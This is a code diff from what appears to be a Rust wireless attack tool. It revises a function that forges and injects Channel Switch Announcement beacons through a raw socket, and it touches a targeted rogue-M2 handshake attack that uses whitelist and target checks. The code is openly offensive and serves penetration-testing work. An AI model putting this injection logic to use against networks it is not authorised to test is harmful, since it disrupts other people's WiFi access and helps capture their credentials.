@@ -11,7 +11,7 @@ use libwifi::{
         components::{MacAddress, RsnCipherSuite},
         Beacon, DeauthenticationReason, ProbeRequest,
     },
-    Addresses,
+    parse_frame, Addresses, Frame,
 };
 use nl80211_ng::channels::WiFiChannel;
 use rand::seq::SliceRandom;
@@ -36,9 +36,10 @@ use crate::{
 //                                                          //
 //////////////////////////////////////////////////////////////
 
-pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String> {
+pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), String> {
     let channel = oxide.get_adjacent_channel();
-    let ap_mac = beacon.header.src().unwrap();
+    let binding = beacon.clone();
+    let ap_mac = binding.header.src().unwrap();
     let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
         dev
     } else {
@@ -66,15 +67,17 @@ pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String
     }
     let new_channel = channel.unwrap();
 
-    let frx = build_csa_beacon(beacon.clone(), new_channel);
-
     // If we are transmitting
     if !oxide.config.notx {
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        for _ in 0..4 {
+            let frx = build_csa_beacon(beacon.clone(), new_channel);
+            beacon = if let Frame::Beacon(bcn) = parse_frame(&frx[10..], false).unwrap() {
+                bcn
+            } else {
+                return Ok(());
+            };
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        }
         ap_data.interactions += 1;
         ap_data.auth_sequence.state = 1;
         oxide.status_log.add_message(StatusMessage::new(
@@ -457,7 +460,7 @@ pub fn rogue_m2_attack_directed(
         if oxide.target_data.whitelist.is_whitelisted(ap) {
             return Ok(());
         }
-        
+
         // Make sure this AP is a target and that this AP is
         if !oxide.target_data.targets.is_target(ap)
             || oxide
